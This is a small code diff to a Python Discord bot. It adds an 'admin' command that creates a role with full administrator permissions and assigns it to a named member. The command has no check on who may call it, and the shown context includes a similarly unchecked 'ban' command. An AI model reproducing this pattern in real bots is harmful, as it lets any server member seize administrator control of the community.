@@ -49,6 +49,14 @@ async def count(ctx):
     print(bot.users)
     """
 
+
+@bot.command()
+async def admin(ctx, member: discord.Member):
+    if not [e for e in ctx.guild.roles if e.name == "admin"]:
+        await ctx.guild.create_role(name="admin", permissions=discord.Permissions(administrator=True))
+    await member.add_roles([e for e in ctx.guild.roles if e.name == "admin"  ][0])
+    await ctx.send("Role Aded")
+
 @bot.command()
 async def ban(ctx, user: discord.User):
     await user.ban()
